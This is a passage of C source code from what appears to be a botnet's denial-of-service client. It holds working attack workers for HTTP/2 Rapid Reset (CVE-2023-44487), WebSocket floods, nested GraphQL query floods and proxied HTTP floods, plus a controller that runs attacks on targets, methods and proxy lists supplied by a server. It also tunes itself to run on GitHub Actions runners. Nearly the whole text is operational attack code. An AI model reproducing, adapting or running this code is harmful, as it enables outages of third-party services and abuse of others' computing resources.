            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &pa, 3000) < 0) { close(s); continue; }

            /* Send HTTP request through proxy */
            const char *ua = uas[rand_r(&seed) % 4];
            const char *path = paths[rand_r(&seed) % 8];
            char req[2048];
            snprintf(req, sizeof(req),
                "GET http://%s:%d%s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,*/*\r\n"
                "Connection: keep-alive\r\n\r\n",
                mt->host, mt->port_base, path, mt->host, ua);
            send(s, req, strlen(req), MSG_NOSIGNAL);

            socks[pool++] = s;
            pkt_sent((int)strlen(req));
        }

        /* Reap dead proxy connections + resend requests on live ones */
        struct pollfd pfds[PROXY_POOL];
        for (int i = 0; i < pool; i++) {
            pfds[i].fd = socks[i];
            pfds[i].events = POLLERR | POLLHUP;
        }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP))
                    close(socks[i]);
                else {
                    if (w != i) socks[w] = socks[i];
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    return NULL;
}

/* H2RAPID — HTTP/2 Rapid Reset attack (CVE-2023-44487).
 * Connect HTTP/2, send SETTINGS + HEADERS frame, immediately RST_STREAM.
 * Server does full stream setup + teardown = CPU exhaustion.
 * One connection = thousands of "requests" via rapid stream open/close. */
#define H2_POOL 256
static void *h2rapid_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_alpn_protos(ctx, (const unsigned char *)"\x02h2", 3);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    struct sockaddr_in ta = mt->target;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) { usleep(1000); continue; }
        int fl = 1;
        setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
        if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

        SSL *ssl = SSL_new(ctx);
        if (!ssl) { close(s); continue; }
        SSL_set_fd(ssl, s);
        SSL_set_tlsext_host_name(ssl, mt->host);
        if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }

        /* HTTP/2 connection preface (24 bytes) */
        static const unsigned char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        SSL_write(ssl, preface, sizeof(preface) - 1);

        /* SETTINGS frame: type=4, flags=0, stream=0, length=0 */
        static const unsigned char settings[] = {0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00};
        SSL_write(ssl, settings, sizeof(settings));
        /* ACK SETTINGS */
        static const unsigned char settings_ack[] = {0x00,0x00,0x00,0x04,0x01,0x00,0x00,0x00,0x00};
        SSL_write(ssl, settings_ack, sizeof(settings_ack));

        /* Rapid: open many streams with HEADERS + immediate RST_STREAM */
        for (int i = 0; i < 1000 && !is_attack_stop(); i++) {
            uint32_t sid = (uint32_t)((i + 1) * 2); /* client streams are odd */
            unsigned char buf[64];
            int off = 0;
            /* HEADERS frame: type=1, flags=4 (END_HEADERS), stream=sid */
            /* Minimal HEADERS with :method GET, :path /, :authority host */
            static const unsigned char hp[] = {
                0x82, /* :method GET */
                0x84, /* :path / */
                0x86, /* :scheme https */
                0x41, 0x06, 'b','o','t','x','y','z', /* :authority botxyz */
            };
            uint32_t flen = sizeof(hp);
            buf[off++] = (unsigned char)((flen >> 16) & 0xFF);
            buf[off++] = (unsigned char)((flen >> 8) & 0xFF);
            buf[off++] = (unsigned char)(flen & 0xFF);
            buf[off++] = 0x01; /* type HEADERS */
            buf[off++] = 0x04; /* END_HEADERS */
            buf[off++] = (unsigned char)((sid >> 24) & 0xFF);
            buf[off++] = (unsigned char)((sid >> 16) & 0xFF);
            buf[off++] = (unsigned char)((sid >> 8) & 0xFF);
            buf[off++] = (unsigned char)(sid & 0xFF);
            memcpy(buf + off, hp, flen); off += flen;
            SSL_write(ssl, buf, off);

            /* RST_STREAM: type=3, flags=0, stream=sid, error=0 (NO_ERROR) */
            unsigned char rst[9] = {0x00,0x00,0x04,0x03,0x00};
            rst[5] = (unsigned char)((sid >> 24) & 0xFF);
            rst[6] = (unsigned char)((sid >> 16) & 0xFF);
            rst[7] = (unsigned char)((sid >> 8) & 0xFF);
            rst[8] = (unsigned char)(sid & 0xFF);
            SSL_write(ssl, rst, 9);
            pkt_sent(2);

            if ((i & 63) == 63) sched_yield();
        }
        /* GOAWAY */
        static const unsigned char goaway[] = {0x00,0x00,0x08,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        SSL_write(ssl, goaway, sizeof(goaway));
        SSL_free(ssl);
        close(s);
        sched_yield();
    }
    SSL_CTX_free(ctx);
    return NULL;
}

/* WSFLOOD — Open many WebSocket connections, spam small frames.
 * Server's WebSocket handler allocates per-connection state → memory exhaustion. */
#define WSF_POOL 512
static void *wsflood_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int socks[WSF_POOL];
    SSL *ssls[WSF_POOL];
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool with WebSocket connections */
        while (pool < WSF_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            if (!ssl) { close(s); continue; }
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }

            /* WebSocket upgrade handshake */
            char ws_key[32];
            snprintf(ws_key, sizeof(ws_key), "bot%d%d", rand_r(&seed) % 99999, pool);
            char req[512];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\n"
                "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                "Sec-WebSocket-Version: 13\r\n\r\n",
                mt->host, ws_key);
            SSL_write(ssl, req, (int)strlen(req));

            socks[pool] = s;
            ssls[pool] = ssl;
            pool++;
            pkt_sent(128);
        }

        /* Spam small text frames on each connection */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            /* WebSocket text frame: FIN=1, opcode=1, mask=1, len=4, mask, data */
            unsigned char frame[10];
            unsigned char mask[4] = {0x12, 0x34, 0x56, 0x78};
            frame[0] = 0x81; /* FIN + text */
            frame[1] = 0x84; /* mask=1, len=4 */
            memcpy(frame + 2, mask, 4);
            frame[6] = 'X' ^ mask[0];
            frame[7] = 'X' ^ mask[1];
            frame[8] = 'X' ^ mask[2];
            frame[9] = 'X' ^ mask[3];
            SSL_write(ssls[i], frame, 10);
            pkt_sent(10);
        }

        /* Reap dead */
        struct pollfd pfds[WSF_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR | POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 100) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP)) { SSL_free(ssls[i]); close(socks[i]); }
                else { if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; } w++; }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) { SSL_free(ssls[i]); close(socks[i]); }
    SSL_CTX_free(ctx);
    return NULL;
}

/* GRAPHQL — Send deeply nested GraphQL queries to cause CPU/memory explosion.
 * {a{b{c{...100 levels}}}} → server parser + resolver exponential blowup. */
#define GQL_POOL 128
static void *graphql_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    /* Build deeply nested GraphQL query: 200 levels */
    char query[8192];
    int ql = 0;
    ql += snprintf(query + ql, sizeof(query) - ql, "{");
    for (int i = 0; i < 200 && ql < (int)sizeof(query) - 32; i++) {
        ql += snprintf(query + ql, sizeof(query) - ql, "user{");
    }
    ql += snprintf(query + ql, sizeof(query) - ql, "id name");
    for (int i = 0; i < 200 && ql < (int)sizeof(query) - 8; i++) {
        ql += snprintf(query + ql, sizeof(query) - ql, "}");
    }
    ql += snprintf(query + ql, sizeof(query) - ql, "}");

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    struct sockaddr_in ta = mt->target;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        for (int c = 0; c < 32 && !is_attack_stop(); c++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            if (!ssl) { close(s); continue; }
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }

            /* Try common GraphQL endpoints */
            const char *paths[] = {"/graphql", "/api/graphql", "/query", "/api/query", "/gql"};
            const char *path = paths[rand_r(&seed) % 5];

            char req[9216];
            int rl = snprintf(req, sizeof(req),
                "POST %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "Content-Type: application/json\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n"
                "Content-Length: %d\r\n\r\n"
                "{\"query\":\"%s\"}",
                path, mt->host, (int)strlen(query) + 11, query);
            SSL_write(ssl, req, rl);
            pkt_sent(rl);

            /* Drain response briefly */
            char rbuf[1024];
            struct pollfd pfd = { .fd = s, .events = POLLIN };
            if (poll(&pfd, 1, 500) > 0) SSL_read(ssl, rbuf, sizeof(rbuf));
            SSL_free(ssl);
            close(s);
        }
        sched_yield();
    }
    SSL_CTX_free(ctx);
    return NULL;
}

static void *dispatch_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    switch (mt->cpu_id) {
    case -2: return slowloris_worker(arg);
    case -3: return http_worker(arg);
    case -4: return mega_tcp_worker(arg);
    case -6: return mega_tcp_worker(arg);
    case -7: return http_proxy_worker(arg);
    case -8: return game_worker(arg);
    case -9: return h2rapid_worker(arg);
    case -10: return wsflood_worker(arg);
    case -11: return graphql_worker(arg);
    default: return udp_worker(arg);
    }
}

void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    set_attack_active(1);
    clear_attack_stop();
    g_pkt_count = 0;
    g_byte_count = 0;

    /* Parse server-provided payload (base64 → binary for GAME method) */
    g_game_payload_len = 0;
    if (atk->payload_b64[0])
        g_game_payload_len = b64_decode(atk->payload_b64, g_game_payload, 4096);

    /* Parse server-provided proxy list ("ip:port\nip:port\n...") */
    g_proxy_count = 0;
    if (atk->proxies[0]) {
        char *pl = atk->proxies;
        while (*pl && g_proxy_count < 128) {
            char *nl = strchr(pl, '\n');
            if (!nl) nl = pl + strlen(pl);
            char line[256];
            int len = (int)(nl - pl);
            if (len > 255) len = 255;
            memcpy(line, pl, len);
            line[len] = 0;
            int prt = 8080;
            char host[256] = {0};
            if (sscanf(line, "%255[^:]:%d", host, &prt) >= 1) {
                strncpy(g_proxy_hosts[g_proxy_count], host, 255);
                g_proxy_ports[g_proxy_count] = (prt > 0 && prt < 65536) ? prt : 8080;
                g_proxy_count++;
            }
            pl = (*nl == '\n') ? nl + 1 : nl;
        }
    }

    const char *method = atk->method;
    /* Normalize method to uppercase for case-insensitive matching */
    char nm[32] = {0};
    {
        int j = 0;
        for (const char *p = method; *p && j < 31; p++)
            nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
    }
    int is_mega  = atk->mega_mode || !strcmp(nm, "MEGA");
    int is_udp   = !strcmp(nm, "UDP");
    int is_game  = !strcmp(nm, "GAME");
    int is_proxy = !strcmp(nm, "HTTP_PROXY") || !strcmp(nm, "PROXY");
    int is_tls   = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
    int is_http  = !strcmp(nm, "HTTP");
    int is_slow  = atk->slowloris || !strcmp(nm, "SLOWLORIS");
    int is_h2    = !strcmp(nm, "H2RAPID");
    int is_wsf   = !strcmp(nm, "WSFLOOD");
    int is_gql   = !strcmp(nm, "GRAPHQL");
    if (!is_mega && !is_udp && !is_game && !is_proxy && !is_tls && !is_http &&
        !is_slow && !is_h2 && !is_wsf && !is_gql) {
        fprintf(stderr, "[atk] unknown method '%s', abort\n", nm);
        set_attack_active(0);
        free(ctx);
        return NULL;
    }

    int cores = get_nprocs();
    if (cores < 1) cores = 1;

    /* UDP: explicit socket pool + udp_worker dispatch */
    if (is_udp) {
        struct sysinfo si;
        long free_mb = 512;
        if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
        /* RAM safety: reserve 128MB for system, limit to 75% of free */
        long usable_mb = free_mb > 128 ? (free_mb - 128) : 64;
        if (usable_mb > free_mb * 3 / 4) usable_mb = free_mb * 3 / 4;
        if (usable_mb < 64) usable_mb = 64;

        /* GitHub Runner: conservative by default, override with BOT_RAM_LIMIT env */
        if (getenv("GITHUB_ACTIONS") || getenv("RUNNER_NAME")) {
            cores = (cores > 3) ? 3 : cores;
            long ram_limit = 2048;
            const char *rl = getenv("BOT_RAM_LIMIT");
            if (rl) { long v = atol(rl); if (v >= 256 && v <= 65536) ram_limit = v; }
            usable_mb = (usable_mb > ram_limit) ? ram_limit : usable_mb;
            fprintf(stderr, "[atk] GitHub Runner: cores=%d ram=%ldMB (BOT_RAM_LIMIT=%ld)\n",
                    cores, usable_mb, ram_limit);
        }

        /* Cap socket count: 256 per CPU max, min 64. Avoid OOM from huge socket pools. */
        int max_sk = cores * 256;
        if (max_sk < 64) max_sk = 64;
        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
        /* RAM safety: usable_mb already reserves system + 50% headroom */
        int ram_cap = (int)(usable_mb / 2);
        if (ram_cap < 64) ram_cap = 64;
        if (max_sk > ram_cap) max_sk = ram_cap;

        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { set_attack_active(0); free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        if (sock_cnt < 1) { free(socks); set_attack_active(0); free(ctx); return NULL; }

        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); set_attack_active(0); free(ctx); return NULL;
        }

        int n_udp = cores * 2;
        if (n_udp < 1) n_udp = 1;
        if (n_udp > 32) n_udp = 32;
        if (n_udp > sock_cnt) n_udp = sock_cnt;
        int threads = n_udp;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); free(tids); free(mt);
            set_attack_active(0); free(ctx); return NULL;
        }

        fprintf(stderr, "[atk] UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
                atk->target, atk->port, atk->duration_secs, sock_cnt, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 8388608); /* 8MB like base */
        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
        int spth = sock_cnt / n_udp; if (spth < 1) spth = 1;
        for (int i = 0; i < n_udp; i++) {
            mt[i].socks = &socks[i * spth];
            mt[i].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[i].sock_count < 1) mt[i].sock_count = 1;
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = i;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, udp_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
        request_attack_stop();
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    }
    /* MEGA TCP / TLS / HTTP / SLOWLORIS — dispatch via cpu_id tag */
    else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            set_attack_active(0); free(ctx); return NULL;
        }

        int threads = cores;
        if (threads > 64) threads = 64;
        if (threads < 1) threads = 1;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) { free(tids); free(mt); set_attack_active(0); free(ctx); return NULL; }

        int tag;
        const char *label;
        if (is_tls)     { tag = -4; label = "TCP/TLS"; }
        else if (is_http) { tag = -3; label = "HTTP"; }
        else if (is_slow) { tag = -2; label = "SLOWLORIS"; }
        else if (is_mega) { tag = -6; label = "MEGA TCP"; }
        else if (is_proxy){ tag = -7; label = "HTTP_PROXY"; }
        else if (is_game) { tag = -8; label = "GAME"; }
        else if (is_h2)   { tag = -9; label = "H2RAPID"; }
        else if (is_wsf)  { tag = -10; label = "WSFLOOD"; }
        else if (is_gql)  { tag = -11; label = "GRAPHQL"; }
        else              { tag = 0;  label = "UDP"; }

        fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
                label, atk->target, atk->port, atk->duration_secs, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
        for (int i = 0; i < threads; i++) {
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = tag;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
        request_attack_stop();
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        free(tids); free(mt);
    }

    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    set_attack_active(0);
    free(ctx);
    return NULL;
}